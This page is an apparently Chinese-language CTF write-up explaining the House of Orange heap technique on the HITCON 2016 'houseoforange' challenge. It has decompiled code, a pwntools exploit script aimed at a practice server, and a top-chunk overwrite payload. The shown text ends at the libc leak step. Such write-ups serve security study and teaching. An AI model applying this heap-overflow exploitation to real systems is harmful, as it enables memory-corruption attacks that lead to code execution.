<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Orange | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Orange</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T09:16:37.969Z" id="updated"> 2023-09-12</time></div></span><br><span>Word Count: <div class="control">2.1k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1>House of orange</h1>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2>
<p>题目中不存在 free 函数或其他释放堆块的函数。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2>
<p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>篡改top chunk size（注意size需要对齐内存页）<br><span class="hljs-number">2.</span>分配比top chunk size大的chunk。<br><span class="hljs-number">3.</span>现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。<br></code></pre></td></tr></tbody></table></figure>
<h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top-chunk-size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>伪造的size必须要对齐到内存页。<br><span class="hljs-number">2.</span>size要大于MINSIZE。<br><span class="hljs-number">3.</span>size要小于之后申请的chunk size + MINISIZE。<br><span class="hljs-number">4.</span>size的prev inuse位必须为<span class="hljs-number">1</span>。<br><span class="hljs-number">5.</span>malloc的大小不能大于mmap分配阈值。<br></code></pre></td></tr></tbody></table></figure>
<h1>例题</h1>
<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange-hitcon-2016"></a>houseoforange_hitcon_2016</h2>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>
保护全开，打开ida</p>
<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> choice; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">sub_1218</span>();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-built_in">menu</span>();<br>      choice = <span class="hljs-built_in">my_read</span>(a1, a2);<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">show</span>();<br>    }<br>    <span class="hljs-keyword">if</span> ( choice &gt; <span class="hljs-number">2</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">3</span> )<br>      {<br>        <span class="hljs-built_in">edit</span>();<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give up"</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        }<br>LABEL_13:<br>        a1 = <span class="hljs-string">"Invalid choice"</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      <span class="hljs-built_in">add</span>();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2>
<p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk">int add()<br>{<br>  unsigned int size; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  int color; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">14</span>h]<br>  _QWORD *v3; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">10</span>h]<br>  _DWORD *v4; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">18</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  <span class="hljs-keyword">if</span> ( num2 &gt; <span class="hljs-number">3</span>u )                              <span class="hljs-regexp">//</span> num开始为<span class="hljs-number">0</span>，可利用add4次<br>  {<br>    puts(<span class="hljs-string">"Too many house"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  v3 = malloc(<span class="hljs-number">0</span>x10uLL);   <span class="hljs-regexp">//</span>chunk_1<br>  printf(<span class="hljs-string">"Length of name :"</span>);<br>  size = my_read();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span>x1000 )<br>    size = <span class="hljs-number">0</span>x1000;<br>  v3[<span class="hljs-number">1</span>] = malloc(size);     <span class="hljs-regexp">//</span>chunk_2<br>  <span class="hljs-keyword">if</span> ( !v3[<span class="hljs-number">1</span>] )<br>  {<br>    puts(<span class="hljs-string">"Malloc error !!!"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  printf(<span class="hljs-string">"Name :"</span>);<br>  my_read2((void *)v3[<span class="hljs-number">1</span>], size);<br>  v4 = calloc(<span class="hljs-number">1</span>uLL, <span class="hljs-number">8</span>uLL);      <span class="hljs-regexp">//</span>chunk_3<br>  printf(<span class="hljs-string">"Price of Orange:"</span>);<br>  *v4 = my_read();<br>  ::color();<br>  printf(<span class="hljs-string">"Color of Orange:"</span>);<br>  color = my_read();<br>  <span class="hljs-keyword">if</span> ( color != <span class="hljs-number">0</span>xDDAA &amp;&amp; (color &lt;= <span class="hljs-number">0</span> || color &gt; <span class="hljs-number">7</span>) )<br>  {<br>    puts(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( color == <span class="hljs-number">0</span>xDDAA )<br>    v4[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>xDDAA;<br>  <span class="hljs-keyword">else</span><br>    v4[<span class="hljs-number">1</span>] = color + <span class="hljs-number">30</span>;<br>  *v3 = v4;<br>  heap_array = v3;<br>  ++num2;<br>  return puts(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sub_EE6</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) == <span class="hljs-number">0xDDAA</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v0 = <span class="hljs-built_in">rand</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[01;38;5;214m%s\x1B[0m\n"</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v0 % <span class="hljs-number">8</span>));<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &lt;= <span class="hljs-number">30</span> || *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &gt; <span class="hljs-number">37</span> )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Color corruption!"</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v2 = <span class="hljs-built_in">rand</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[%dm%s\x1B[0m\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>), *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v2 % <span class="hljs-number">8</span>));<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2>
<p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sub_107C</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  _DWORD *v1; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2u</span> )                               <span class="hljs-comment">// num开始为0，可利用edit3次</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You can't upgrade more"</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Length of name :"</span>);<br>  size = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x1000</span> )<br>    size = <span class="hljs-number">4096</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name:"</span>);                              <span class="hljs-comment">// size由我们输入，存在溢出</span><br>  <span class="hljs-built_in">my_read2</span>((<span class="hljs-type">void</span> *)heap_array[<span class="hljs-number">1</span>], size);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of Orange: "</span>);<br>  v1 = (_DWORD *)*heap_array;<br>  *v1 = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-built_in">color</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Color of Orange: "</span>);<br>  v3 = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">0xDDAA</span> &amp;&amp; (v3 &lt;= <span class="hljs-number">0</span> || v3 &gt; <span class="hljs-number">7</span>) )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">0xDDAA</span> )<br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = <span class="hljs-number">0xDDAA</span>;<br>  <span class="hljs-keyword">else</span><br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = v3 + <span class="hljs-number">30</span>;<br>  ++num;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2>
<p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2>
<p>先把前面的写好</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import  *<br> <br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <span class="hljs-comment">#小端序，linux系统，64位架构,debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26188</span>) <span class="hljs-comment">#连接远程程序</span><br>elf = <span class="hljs-variable constant_">ELF</span>(binary)     <br>libc = <span class="hljs-variable constant_">ELF</span>(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>one_gadget[<span class="hljs-number">0</span>] = <span class="hljs-number">0x45216</span><br>s       = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendlineafter(delim, data)<br>r       = <span class="hljs-built_in">lambda</span> num=<span class="hljs-number">4096</span>           <span class="hljs-symbol">:sh</span>.recv(num)<br>ru      = <span class="hljs-built_in">lambda</span> delims  <span class="hljs-symbol">:sh</span>.recvuntil(delims )<br>itr     = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:sh</span>.interactive()<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-built_in">lambda</span> name,addr          <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg=<span class="hljs-built_in">lambda</span> address,<span class="hljs-symbol">data:</span>log.success(<span class="hljs-string">'%s: '</span><span class="hljs-string">%(address)</span>+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(str(color))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(str(color))<br></code></pre></td></tr></tbody></table></figure>
<h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top-chunk"></a>修改top chunk</h3>
<p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p>
<figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">add<span class="hljs-comment">(0x30,'aaaa\n')</span><br>dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">30</span> +p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0xf81)</span><br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>
top chunk大小为0x0000000000020f81<br>
修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top-chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x1000, <span class="hljs-string">'a\n'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3>
<p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p>
